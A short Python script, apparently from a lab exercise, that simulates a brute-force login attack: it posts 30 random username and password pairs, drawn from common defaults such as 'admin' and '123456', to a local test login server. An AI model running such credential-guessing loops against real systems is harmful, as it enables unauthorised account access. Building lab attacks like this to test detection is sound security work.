import requests
import time
import random

# Replace this with Cheyenne's VM IP address
URL = "http://127.0.0.1:5000/"

fake_usernames = [
    "admin",
    "administrator",
    "bankuser",
    "root",
    "test",
    "customer",
    "employee"
]

fake_passwords = [
    "password",
    "123456",
    "admin123",
    "letmein",
    "qwerty",
    "password123",
    "wrongpass"
]


def run_attack_simulation():
    print("Starting simulated brute-force login attack...")

    for i in range(30):
        username = random.choice(fake_usernames)
        password = random.choice(fake_passwords)

        data = {
            "username": username,
            "password": password
        }

        try:
            response = requests.post(URL, data=data, timeout=3)
            print(
                f"Attempt {i + 1}: "
                f"username={username}, password={password}, "
                f"status={response.status_code}"
            )

        except requests.exceptions.ConnectionError:
            print("Could not connect to the VM login server.")
            print("Check VM IP, firewall, and that app.py is running.")
            break

        except requests.exceptions.Timeout:
            print("Connection timed out.")
            print("Check network/firewall settings.")
            break

        time.sleep(0.5)

    print("Attack simulation complete.")


if __name__ == "__main__":
    run_attack_simulation()
